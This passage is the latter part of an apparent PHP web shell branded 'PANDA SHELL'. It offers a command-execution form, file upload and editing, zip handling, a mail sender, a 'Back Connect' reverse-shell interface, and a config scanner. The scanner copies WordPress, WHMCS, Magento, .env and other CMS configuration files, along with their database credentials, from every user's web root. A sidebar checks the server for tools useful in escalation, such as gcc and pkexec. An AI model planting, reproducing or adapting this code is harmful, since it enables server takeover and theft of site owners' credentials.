                           $configChecks = [ 'wp-config.php' => 'WordPress', 'configuration.php' => 'Joomla_WHMCS', 'config/config.inc.php' => 'PrestaShop', 'app/etc/local.xml' => 'Magento1', 'app/etc/env.php' => 'Magento2', 'sites/default/settings.php' => 'Drupal', '.env' => 'Laravel_Symfony_etc', 'config.php' => 'Generic_config', 'application/config/database.php' => 'CodeIgniter_DB', 'includes/config.php' => 'vBulletin_OsCommerce', 'whmcs/configuration.php' => 'WHMCS_subdir', 'support/configuration.php' => 'WHMCS_support', 'secure/configuration.php' => 'WHMCS_secure', 'clients/configuration.php' => 'WHMCS_clients', 'client/configuration.php' => 'WHMCS_client', 'billing/configuration.php' => 'WHMCS_billing', 'admin/config.php' => 'OpenCart_admin_config', 'config.php' => 'OpenCart_root_config', ];
                          foreach ($webRootGuesses as $webRootDir) {
                              if (is_dir($webRootDir) && is_readable($webRootDir)) {
                                  foreach ($configChecks as $configFileRelative => $configType) {
                                       $fullConfigPath = $webRootDir . '/' . $configFileRelative;
                                       if (is_readable($fullConfigPath)) {
                                           $configContent = @file_get_contents($fullConfigPath);
                                           if ($configContent !== false && !empty(trim($configContent))) {
                                               $safeFileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '_', $username . '-' . $configType . '-' . basename($configFileRelative)) . '.txt'; $savePath = $configDirPath . '/' . $safeFileName;
                                               if (@file_put_contents($savePath, $configContent) !== false) { @chmod($savePath, 0600); $configFilesFound[] = htmlspecialchars($safeFileName); }
                                               else { error_log("ConfigGrab: Failed to save $savePath for user $username"); }
                                           }
                                       }
                                  }
                              }
                          }
                      }
                  }
                  @fclose($etc);
                  if (!empty($configFilesFound)) {
                       $responseMessage .= "<p style='color: green;'>Found and saved " . count($configFilesFound) . " potential config files:</p><ul>"; foreach ($configFilesFound as $foundFile) { $responseMessage .= "<li>" . $foundFile . "</li>"; } $responseMessage .= "</ul>";
                  } else { $responseMessage .= "<p style='color: orange;'>Scan completed. No readable configuration files found based on common paths.</p>"; }
             }
        }
    }
    $responseMessage .= $errorMessage; $errorMessage = '';
}

// Note: This section is still present but won't be triggered by the simplified UI dropdown
if (isset($_POST['extract-zip']) && isset($_FILES['extract-zip-file'])) {
     if ($_FILES['extract-zip-file']['error'] !== UPLOAD_ERR_OK) { $errorMessage = 'Error during ZIP file upload: Code ' . $_FILES['extract-zip-file']['error']; }
     elseif (!class_exists('ZipArchive')) { $errorMessage = 'Error: ZipArchive class not found. PHP ZIP extension is required.'; }
     else {
         $extractZipFile = $_FILES['extract-zip-file']['tmp_name']; $extractZipOriginalName = basename($_FILES['extract-zip-file']['name']);
         $zip = new ZipArchive;
         if ($zip->open($extractZipFile) === TRUE) {
             if (!is_writable($currentDirectory)) { $errorMessage = 'Error: Cannot write to extraction directory. Check permissions.'; }
             else { if ($zip->extractTo($currentDirectory)) { $responseMessage = 'ZIP file "' . htmlspecialchars($extractZipOriginalName) . '" extracted successfully.'; } else { $errorMessage = 'Error extracting ZIP file. Check permissions or archive integrity.'; } }
            $zip->close();
         } else { $errorMessage = 'Error opening ZIP file. It might be corrupted or not a valid ZIP.'; }
     }
}

// Note: This section is still present but won't be triggered by the simplified UI dropdown
if (isset($_POST['zip']) && isset($_POST['zip-target'])) {
    $itemToZip = trim($_POST['zip-target']);
    if (empty($itemToZip)) { $errorMessage = 'Error: No file or directory specified for zipping.'; }
    elseif (!file_exists($itemToZip)) { $errorMessage = 'Error: Specified file or directory does not exist: ' . htmlspecialchars(basename($itemToZip)); }
    elseif (!class_exists('ZipArchive')) { $errorMessage = 'Error: ZipArchive class not found. PHP ZIP extension is required.'; }
    elseif (!is_writable($currentDirectory)) { $errorMessage = 'Error: Cannot write ZIP file to current directory. Check permissions.'; }
    else {
        $zipFileName = basename($itemToZip) . '_' . date('YmdHis') . '.zip'; $zipFilePath = rtrim($currentDirectory, '/') . '/' . $zipFileName;
        $zip = new ZipArchive;
        if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            $success = false;
            if (is_dir($itemToZip)) {
                $files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($itemToZip, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST );
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                         $filePath = $file->getRealPath(); $relativePath = substr($filePath, strlen(realpath($itemToZip)) + 1);
                         if ($relativePath !== false) { if (!$zip->addFile($filePath, $relativePath)) { $errorMessage = 'Error adding file to ZIP: ' . htmlspecialchars($relativePath); $success = false; break; } else { $success = true; } }
                    }
                }
            } elseif (is_file($itemToZip)) { if ($zip->addFile($itemToZip, basename($itemToZip))) { $success = true; } else { $errorMessage = 'Error adding file to ZIP: ' . htmlspecialchars(basename($itemToZip)); $success = false; } }
            if ($zip->close()) {
                 if ($success) { $responseMessage = 'Item zipped successfully: <a href="?dir=' . urlencode($currentDirectory) . '&read=' . urlencode($zipFilePath) . '">' . htmlspecialchars($zipFileName) . '</a>'; }
                 elseif (empty($errorMessage)) { $errorMessage = 'Specified item was empty or could not be zipped.'; @unlink($zipFilePath); }
                 else { @unlink($zipFilePath); }
            } else { $errorMessage = 'Error closing the ZIP archive.'; @unlink($zipFilePath); }
        } else { $errorMessage = 'Error creating ZIP archive file. Check permissions.'; }
    }
}

if (isset($_GET['response'])) { $responseMessage = htmlspecialchars(urldecode($_GET['response'])); }
if (isset($_GET['error'])) { $errorMessage = htmlspecialchars(urldecode($_GET['error'])); }

$isActionView = isset($_GET['read']) || isset($_GET['gas']) || isset($_GET['do']) || isset($_GET['create']) || isset($_GET['edit']) || isset($_GET['chmod']) || isset($_GET['hahay']);

$currentHour = (int)date('G');
$darkModeStartHour = 18; $darkModeEndHour = 6;
$isDarkMode = ($currentHour >= $darkModeStartHour || $currentHour < $darkModeEndHour);
$bodyClass = $isDarkMode ? 'dark-mode' : '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>PANDA SHELL</title> <link rel="stylesheet" href="https://raw.githack.com/Mainhack-Exec/mainhack/refs/heads/main/GG.css">
    <style>
        body { font-family: sans-serif; background-color: #f4f4f4; color: #333; margin: 0; }
        .container { max-width: 1000px; margin: 15px auto; background: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1, h2, h3 { color: #555; }
        hr { border: 0; border-top: 1px solid #eee; margin: 20px 0; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { padding: 8px 12px; border: 1px solid #ddd; text-align: left; vertical-align: middle; }
        th { background-color: #f9f9f9; }
        tr:nth-child(even) { background-color: #fdfdfd; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .button, input[type="submit"], input[type="button"], select, .summon-button { background-color: #007bff; color: white; padding: 8px 15px; border: none; border-radius: 3px; cursor: pointer; font-size: 14px; margin: 2px; vertical-align: middle; }
        .button:hover, input[type="submit"]:hover, input[type="button"]:hover, select:hover, .summon-button:hover { background-color: #0056b3; }
        input[type="text"], input[type="file"], textarea, select { padding: 8px; border: 1px solid #ccc; border-radius: 3px; margin: 2px; box-sizing: border-box; font-size: 14px; }
        input[type="file"] { padding: 5px; }
        .command-output, .edit-file, .change-permission, .rename-form, .extract-zip-form { background: #eee; border: 1px solid #ccc; padding: 15px; margin-top: 15px; border-radius: 3px; overflow-x: auto; }
        .command-output pre, .edit-file textarea { white-space: pre-wrap; word-wrap: break-word; font-family: monospace; font-size: 13px; color: #222; }
        .edit-file textarea { width: 100%; min-height: 400px; resize: vertical; }
        .breadcrumb { margin-bottom: 15px; font-size: 14px; background: #eee; padding: 8px; border-radius: 3px; }
        .breadcrumb a { margin: 0 2px; }
        .response-message { color: green; font-weight: bold; margin-top: 10px; background-color: #e6ffed; border: 1px solid #b3ffc6; padding: 10px; border-radius: 3px; }
        .error-message { color: red; font-weight: bold; margin-top: 10px; background-color: #ffe6e6; border: 1px solid #ffb3b3; padding: 10px; border-radius: 3px; }
        .upload-cmd-container { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 20px; margin-top: 15px; }
        .upload-form, .cmd-form { flex: 1; min-width: 300px; }
        .cmd-form input[type="text"] { width: calc(100% - 100px); }
        .empty-button { display: none; }
        .dropdown select { padding: 5px 8px; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
        .footer a { color: #666; }
        .sidebar { position: fixed; top: 0; right: -350px; width: 300px; height: 100%; background-color: #f8f9fa; border-left: 1px solid #dee2e6; box-shadow: -2px 0 5px rgba(0,0,0,0.1); transition: right 0.3s ease; z-index: 1000; overflow-y: auto; padding: 15px; }
        .sidebar.open { right: 0; }
        .sidebar-content { }
        .sidebar-close { text-align: right; margin-bottom: 15px; }
        .sidebar-close button { background: #dc3545; color: white; padding: 5px 10px; }
        .info-container { margin-bottom: 20px; }
        .info-container h2 { border-bottom: 1px solid #eee; padding-bottom: 5px; margin-bottom: 10px; font-size: 1.1em; }
        .info-list { list-style: none; padding: 0; margin: 0; font-size: 0.9em; }
        .info-list li { margin-bottom: 8px; word-wrap: break-word; }
        .info-list li select { width: 100%; }
        .menu-icon { display: inline-block; cursor: pointer; padding: 10px; margin-left: 15px; vertical-align: middle; }
         .menu-icon::before { content: '\2630'; font-size: 20px; }
        .dark-mode { background-color: #1a1a1a; color: #e0e0e0; }
        .dark-mode .container { background: #2b2b2b; box-shadow: 0 0 10px rgba(0,0,0,0.5); border: 1px solid #444; }
        .dark-mode h1, .dark-mode h2, .dark-mode h3 { color: #cccccc; }
        .dark-mode h1 a span { color: #33cc33 !important; }
        .dark-mode hr { border-top: 1px solid #444; }
        .dark-mode table { border: 1px solid #555; }
        .dark-mode th, .dark-mode td { border: 1px solid #555; }
        .dark-mode th { background-color: #3a3a3a; color: #e0e0e0; }
        .dark-mode tr:nth-child(even) { background-color: #303030; }
         .dark-mode tr:hover { background-color: #404040; }
        .dark-mode a { color: #66b3ff; }
        .dark-mode a:hover { color: #99ccff; }
         .dark-mode .button, .dark-mode input[type="submit"], .dark-mode input[type="button"], .dark-mode select, .dark-mode .summon-button { background-color: #0056b3; color: #ffffff; border: 1px solid #004080; }
        .dark-mode .button:hover, .dark-mode input[type="submit"]:hover, .dark-mode input[type="button"]:hover, .dark-mode select:hover, .dark-mode .summon-button:hover { background-color: #004080; border-color: #002a53; }
        .dark-mode input[type="text"], .dark-mode input[type="file"], .dark-mode textarea, .dark-mode select { background-color: #333; color: #e0e0e0; border: 1px solid #666; }
        .dark-mode input[type="file"] { color-scheme: dark; }
        .dark-mode .command-output, .dark-mode .edit-file, .dark-mode .change-permission, .dark-mode .rename-form, .dark-mode .extract-zip-form { background: #3a3a3a; border: 1px solid #555; color: #e0e0e0; }
        .dark-mode .command-output pre, .dark-mode .edit-file textarea { color: #e0e0e0; background-color: #282828; }
         .dark-mode .breadcrumb { background: #3a3a3a; color: #ccc; border: 1px solid #555; }
        .dark-mode .response-message { background-color: #1a4d2e; border-color: #2a6d4e; color: #c8e6c9; }
        .dark-mode .error-message { background-color: #611a1a; border-color: #8d2a2a; color: #ffcdd2; }
        .dark-mode td span[style*="color: green"] { color: #66bb6a !important; }
        .dark-mode td span[style*="color: red"] { color: #ef5350 !important; }
        .dark-mode .footer { color: #aaa; }
        .dark-mode .footer a { color: #ccc; }
        .dark-mode .sidebar { background-color: #252525; border-left: 1px solid #444; box-shadow: -2px 0 5px rgba(0,0,0,0.4); }
         .dark-mode .sidebar-close button { background: #8b2330; color: white; }
         .dark-mode .info-container h2 { border-bottom: 1px solid #444; color: #c5c5c5; }
         .dark-mode .info-list { color: #b5b5b5; }
         .dark-mode .info-list span[style*="color:red"] { color: #ef5350 !important; }
         .dark-mode .info-list span[style*="color:green"] { color: #66bb6a !important; }
         .dark-mode .info-list span[style*="color:orange"] { color: #ffa726 !important; }
		 
    </style>
</head>
<body class="<?php echo $bodyClass; ?>">
    <div class="container">
        <h1>[ <a href="https://t.me/MAlNHACK" target="_blank" style="text-decoration: none;"><span style="color: green;">PANDA SHELL</span></a> ] <span class="menu-icon" onclick="toggleSidebar()" title="Toggle Server Info"></span></h1>
        <hr>
        <div class="button-container">
             <form method="post" style="display: inline-block;"> <input type="submit" name="Summon" value="Adminer" class="summon-button" title="Download Adminer DB Tool"> </form>
             <button type="button" onclick="window.location.href='?dir=<?php echo urlencode($currentDirectory); ?>&gas=1'" class="summon-button" title="Test Mail Function">Mail Test</button>
             <button type="button" onclick="window.location.href='?dir=<?php echo urlencode($currentDirectory); ?>&do=bc'" class="summon-button" title="Open Back Connect Interface">BC</button>
             <button type="button" onclick="window.location.href='?dir=<?php echo urlencode($currentDirectory); ?>&goo=config'" class="summon-button" title="Scan for CMS Config Files">Config Scan</button>
             <a href="?dir=<?php echo urlencode(dirname(__FILE__)); ?>" class="summon-button" title="Go to Shell Directory">HOME</a>  </div>
        <hr>
         <div class="actions-container" style="margin-bottom: 15px;">
             <select onchange="if(this.value) window.location.href='?dir=<?php echo urlencode($currentDirectory); ?>&create=' + this.value; this.selectedIndex=0;"> <option value="" selected disabled>Create...</option> <option value="file">New File</option> <option value="folder">New Folder</option> </select>
         </div>

         <?php if (!empty($errorMessage)) : ?> <div class="error-message"><?php echo $errorMessage; ?></div> <?php endif; ?>
         <?php if (!empty($responseMessage)) : ?> <div class="response-message"><?php echo $responseMessage; ?></div> <?php endif; ?>

        <?php if (isset($_GET['gas'])) : ?>
              <div class="mailer-form command-output"> <h2>Mail Test</h2> <form method="post" action="?dir=<?php echo urlencode($currentDirectory); ?>&gas=1"> <input type="text" name="email" placeholder="Enter recipient email" required size="30"> <input type="submit" value="Send Test Email &raquo;"> </form>
                  <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_GET['gas'])) { $recipientEmail = filter_var(trim($_POST['email']), FILTER_VALIDATE_EMAIL); if ($recipientEmail) { $senderDomain = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'unknown.host'; $uniqueId = substr(md5(uniqid(rand(), true)), 0, 8); $subject = "PANDA Mailer Test [" . $uniqueId . "] from " . $senderDomain; $messageBody = "<html><body><h1>Test Email from PANDA</h1><p>Server: " . htmlspecialchars($senderDomain) . "</p><p>This is a test email sent from the PANDA shell at " . date('Y-m-d H:i:s T') . ".</p><p>Unique ID: " . htmlspecialchars($uniqueId) . "</p></body></html>"; $headers = "MIME-Version: 1.0\r\nContent-type:text/html;charset=UTF-8\r\nFrom: PANDA Tester <noreply@{$senderDomain}>\r\n"; if (@mail($recipientEmail, $subject, $messageBody, $headers)) { echo "<p style='color: green; margin-top: 10px;'>Test email sent to <b>" . htmlspecialchars($recipientEmail) . "</b>. ID: " . htmlspecialchars($uniqueId) . ". Check spam folder too.</p>"; } else { $error = error_get_last(); echo "<p style='color: red; margin-top: 10px;'>Failed to send email. Check server's mail configuration. " . ($error ? htmlspecialchars($error['message']) : '') . "</p>"; } } else { echo "<p style='color: red; margin-top: 10px;'>Invalid email address provided.</p>"; } } ?>
             </div>
         <?php endif; ?>

        <?php if (isset($_GET['do']) && $_GET['do'] == 'bc') : ?>
              <div id="backconnect-form" class="command-output"> <h2>Back Connect</h2> <p><b>Warning:</b> Opens a direct shell connection. Use only trusted IPs/Ports.</p> <form method='post' action="?dir=<?php echo urlencode($currentDirectory); ?>&do=bc"> <table> <tr><td>IP Address:</td><td><input type='text' name='ip' required placeholder="Listener IP"></td></tr> <tr><td>Port:</td><td><input type='text' name='port' required placeholder="Listener Port (e.g., 4444)"></td></tr> <tr><td></td><td><input type='submit' name='bind' value='Open Connection'></td></tr> </table> </form> <?php if (isset($_POST['bind'])) { echo $errorMessage; } ?> </div>
         <?php endif; ?>

        <?php if (isset($_GET['create']) && $_GET['create'] === 'file') : ?> <div class="rename-form"> <h2>Create New File</h2> <form method="post" action="?dir=<?php echo urlencode($currentDirectory); ?>&create=file"> <input type="text" name="file_name" placeholder="Enter new file name" required size="40"> <input type="submit" value="Create File" name="create_file" class="button"> <a href="?dir=<?php echo urlencode($currentDirectory); ?>" class="button">Cancel</a> </form> </div> <?php endif; ?>
        <?php if (isset($_GET['create']) && $_GET['create'] === 'folder') : ?> <div class="rename-form"> <h2>Create New Folder</h2> <form method="post" action="?dir=<?php echo urlencode($currentDirectory); ?>&create=folder"> <input type="text" name="folder_name" placeholder="Enter new folder name" required size="40"> <input type="submit" value="Create Folder" name="create_folder" class="button"> <a href="?dir=<?php echo urlencode($currentDirectory); ?>" class="button">Cancel</a> </form> </div> <?php endif; ?>

        <?php /* Note: Chmod form display logic remains but won't be triggered by table actions */ ?>
        <?php if (isset($_GET['chmod']) && file_exists($_GET['chmod'])) : ?> <div class="change-permission"> <h2>Change Permission: <?php echo htmlspecialchars(basename($_GET['chmod'])); ?></h2> <form method="post" action="?dir=<?php echo urlencode(dirname($_GET['chmod'])); ?>&chmod=<?php echo urlencode($_GET['chmod']); ?>"> <input type="text" name="permission" placeholder="Octal (e.g., 0755)" required pattern="[0-7]{3,4}" title="Enter 3 or 4 octal digits" value="<?php echo substr(sprintf('%o', @fileperms($_GET['chmod'])), -4); ?>"> <button class="button" type="submit">Change Permissions</button> <a href="?dir=<?php echo urlencode(dirname($_GET['chmod'])); ?>" class="button">Cancel</a> </form> </div> <?php elseif (isset($_GET['chmod'])) : ?> <div class="error-message">Error: Cannot change permission - file or folder not found.</div> <?php endif; ?>

        <?php /* Note: Unzip form display logic remains but won't be triggered by table actions */ ?>
        <?php if (isset($_GET['hahay']) && $_GET['hahay'] == 'unzip') : ?> <div class="extract-zip-form command-output"> <h2>Unzip Archive</h2> <form method="post" enctype="multipart/form-data" action="?dir=<?php echo urlencode($currentDirectory); ?>&hahay=unzip"> <label for="extract-zip-file">Select ZIP File to Extract:</label> <input type="file" name="extract-zip-file" required accept=".zip"> <button class="button" type="submit" name="extract-zip">Extract ZIP</button> <a href="?dir=<?php echo urlencode($currentDirectory); ?>" class="button">Cancel</a> </form> </div> <?php endif; ?>
        <?php /* Note: Zip form display logic remains but won't be triggered by table actions */ ?>
        <?php if (isset($_GET['hahay']) && $_GET['hahay'] == 'extract_zip') : ?> <div class="zip-form command-output"> <h2>Zip File / Directory</h2> <form method="post" action="?dir=<?php echo urlencode($currentDirectory); ?>&hahay=extract_zip"> <label for="zip-target">File or Directory Path to Zip:</label> <input type="text" name="zip-target" placeholder="Enter path relative to current dir, or full path" required size="50" value="<?php echo isset($_GET['zip_target']) ? htmlspecialchars(urldecode($_GET['zip_target'])) : ''; ?>"> <button class="button" type="submit" name="zip">Create Zip</button> <a href="?dir=<?php echo urlencode($currentDirectory); ?>" class="button">Cancel</a> </form> </div> <?php endif; ?>

        <?php if (isset($_GET['read'])) : ?>
            <?php $fileToRead = $_GET['read']; $fileDir = dirname($fileToRead); $encodedDir = urlencode($fileDir); $encodedFileToRead = urlencode($fileToRead); ?>
            <?php if (is_file($fileToRead)) : ?>
                <?php $contentRead = readFileContent($fileToRead); ?>
                <div class="edit-file"> <h3>Viewing / Editing File: <?php echo htmlspecialchars(basename($fileToRead)); ?></h3>
                    <?php if (strpos($contentRead, 'Error:') === 0) : ?>
                        <p style="color: red;"><?php echo htmlspecialchars($contentRead); ?></p> <hr> <a href="?dir=<?php echo $encodedDir; ?>" class="button">Back to Directory</a>
                    <?php else : ?>
                        <?php $isEditable = is_writable($fileToRead); $readOnlyAttr = !$isEditable ? 'readonly' : ''; $disabledAttr = !$isEditable ? 'disabled' : ''; if (!$isEditable) { echo '<p style="color: orange; font-weight: bold;">File is not writable. Editing disabled.</p>'; } ?>
                        <form method="post" action="?dir=<?php echo $encodedDir; ?>&edit=<?php echo $encodedFileToRead; ?>"> <textarea name="content" <?php echo $readOnlyAttr; ?>><?php echo htmlspecialchars($contentRead); ?></textarea><br> <button class="button" type="submit" <?php echo $disabledAttr; ?>>Save Changes</button> <a href="?dir=<?php echo $encodedDir; ?>" class="button">Cancel / Back</a> </form>
                    <?php endif; ?>
                 </div>
            <?php else : ?>
                 <div class="error-message">Error: File not found or is not a file.</div> <div style="margin-top:10px;"><a href="?dir=<?php echo $encodedDir; ?>" class="button">Back to Directory</a></div>
            <?php endif; ?>
        <?php endif; ?>

        <?php if (!$isActionView): ?>
            <hr>
            <div class="upload-cmd-container">
                <div class="upload-form"> <h2>Upload File</h2> <form method="post" enctype="multipart/form-data" action="?dir=<?php echo urlencode($currentDirectory); ?>"> <input type="file" name="file"> <button class="button" type="submit" name="upload">Upload</button> </form> </div>
                <div class="cmd-form"> <h2>Execute Command</h2> <form method="post" action="?dir=<?php echo urlencode($currentDirectory); ?>"> <span style="font-family: monospace;"><?php echo htmlspecialchars(@get_current_user()) . "@" . htmlspecialchars(@gethostname()) . ":" . htmlspecialchars(basename($currentDirectory)) . "$ "; ?></span> <input type='text' size='50' name='cmd' placeholder="Enter command" autofocus> <input type="submit" value="Execute" class="button"> </form> </div>
            </div>
            <?php if (!empty($cmdOutput)) : ?> <div class="command-output"> <h3>Command Output:</h3> <pre><?php echo htmlspecialchars($cmdOutput); ?></pre> </div> <?php endif; ?>
            <hr>
            <div class="filemanager-container"> <h2>File Manager</h2> <?php showBreadcrumb($currentDirectory); ?> <?php showFileTable($currentDirectory); ?> </div>
        <?php endif; ?>

    </div> <div class="sidebar" id="sidebar">
        <div class="sidebar-content">
            <div class="sidebar-close"> <button onclick="toggleSidebar()">Close &times;</button> </div>
            <div class="info-container"> <h2>Server Info</h2>
                <?php function countDomainsOnIP($ip) { return 'N/A (Requires external lookup)'; } function formatBytesDisplay($bytes, $precision = 2) { if ($bytes === false || $bytes < 0) return 'N/A'; $units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB'); $bytes = max($bytes, 0); $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= (1 << (10 * $pow)); return round($bytes, $precision) . ' ' . $units[$pow]; } $serverIPAddr = $_SERVER['SERVER_ADDR'] ?? (@gethostbyname(@gethostname()) ?: 'N/A'); $diskTotal = @disk_total_space('/'); $diskFree = @disk_free_space('/'); ?>
                <ul class="info-list"> <li>Hostname: <?php echo htmlspecialchars(@gethostname() ?: 'N/A'); ?></li> <li>Server IP: <?php echo htmlspecialchars($serverIPAddr); ?></li> <li>PHP Version: <?php echo htmlspecialchars(@phpversion() ?: 'N/A'); ?></li> <li>Server Software: <?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'N/A'); ?></li> <li>System: <?php echo htmlspecialchars(@php_uname() ?: 'N/A'); ?></li> <?php if ($diskTotal !== false) : ?><li>HDD Total: <?php echo formatBytesDisplay($diskTotal); ?></li><?php endif; ?> <?php if ($diskFree !== false) : ?><li>HDD Free: <?php echo formatBytesDisplay($diskFree); ?></li><?php endif; ?> <li>Domains on IP: <?php echo countDomainsOnIP($serverIPAddr); ?></li> </ul>
            </div>
            <div class="info-container"> <h2>System Features</h2>
                 <ul class="info-list">
                     <?php function checkCommand($command) { @exec("command -v " . escapeshellarg($command) . " >/dev/null 2>&1", $output, $return_var); return $return_var === 0; } $features = [ 'Safe Mode' => @ini_get('safe_mode') ? '<span style="color:red;">On</span>' : '<span style="color:green;">Off</span>', 'disable_functions' => !empty(@ini_get('disable_functions')) ? '<span style="color:orange; font-size:0.9em;" title="' . htmlspecialchars(@ini_get('disable_functions')) . '">Exists</span>' : '<span style="color:green;">None</span>', 'allow_url_fopen' => @ini_get('allow_url_fopen') ? '<span style="color:green;">On</span>' : '<span style="color:red;">Off</span>', 'allow_url_include' => @ini_get('allow_url_include') ? '<span style="color:red;">On</span>' : '<span style="color:green;">Off</span>', 'magic_quotes_gpc' => function_exists('get_magic_quotes_gpc') && @get_magic_quotes_gpc() ? '<span style="color:red;">On</span>' : '<span style="color:green;">Off</span>', 'register_globals' => @ini_get('register_globals') ? '<span style="color:red;">On</span>' : '<span style="color:green;">Off</span>', 'open_basedir' => !empty(@ini_get('open_basedir')) ? '<span style="color:orange;" title="' . htmlspecialchars(@ini_get('open_basedir')) . '">Exists</span>' : '<span style="color:green;">None</span>', 'cURL' => function_exists('curl_init') ? '<span style="color:green;">Enabled</span>' : '<span style="color:red;">Disabled</span>', 'ZipArchive' => class_exists('ZipArchive') ? '<span style="color:green;">Enabled</span>' : '<span style="color:red;">Disabled</span>', 'MySQLi' => function_exists('mysqli_connect') ? '<span style="color:green;">Enabled</span>' : '<span style="color:red;">Disabled</span>', 'PDO' => class_exists('PDO') ? '<span style="color:green;">Enabled</span>' : '<span style="color:red;">Disabled</span>', 'wget' => checkCommand('wget') ? '<span style="color:green;">Yes</span>' : '<span style="color:red;">No</span>', 'curl (cmd)' => checkCommand('curl') ? '<span style="color:green;">Yes</span>' : '<span style="color:red;">No</span>', 'perl' => checkCommand('perl') ? '<span style="color:green;">Yes</span>' : '<span style="color:red;">No</span>', 'python' => checkCommand('python') ? '<span style="color:green;">Yes</span>' : (checkCommand('python3') ? '<span style="color:green;">Yes (py3)</span>' :'<span style="color:red;">No</span>'), 'gcc' => checkCommand('gcc') ? '<span style="color:green;">Yes</span>' : '<span style="color:red;">No</span>', 'pkexec' => checkCommand('pkexec') ? '<span style="color:red;">Yes</span>' : '<span style="color:green;">No</span>', 'git' => checkCommand('git') ? '<span style="color:green;">Yes</span>' : '<span style="color:red;">No</span>', ]; ?>
                     <?php foreach ($features as $feature => $status) : ?> <li><?php echo htmlspecialchars($feature); ?>: <?php echo $status; ?></li> <?php endforeach; ?>
                 </ul>
            </div>
            <div class="info-container"> <h2>User Info</h2> <ul class="info-list"> <li>Username: <?php echo htmlspecialchars(@get_current_user() ?: 'N/A'); ?></li> <li>User ID (UID): <?php echo htmlspecialchars(@getmyuid() ?: 'N/A'); ?></li> <li>Group ID (GID): <?php echo htmlspecialchars(@getmygid() ?: 'N/A'); ?></li> <li>Script Owner UID: <?php echo htmlspecialchars(@getmyinode() ? @fileowner(__FILE__) : 'N/A'); ?></li> <li>Current Dir Owner: <?php echo htmlspecialchars(@fileowner('.') ?: 'N/A'); ?></li> </ul> </div>
        </div>
    </div>
    <script> function toggleSidebar() { var sidebar = document.getElementById('sidebar'); sidebar.classList.toggle('open'); } document.addEventListener('click', function(event) { var sidebar = document.getElementById('sidebar'); var menuIcon = document.querySelector('.menu-icon'); if (sidebar.classList.contains('open') && !sidebar.contains(event.target) && !menuIcon.contains(event.target)) { sidebar.classList.remove('open'); } }); /* The handleActionChange function is included within the showFileTable PHP function above. */ </script>
</body>
</html>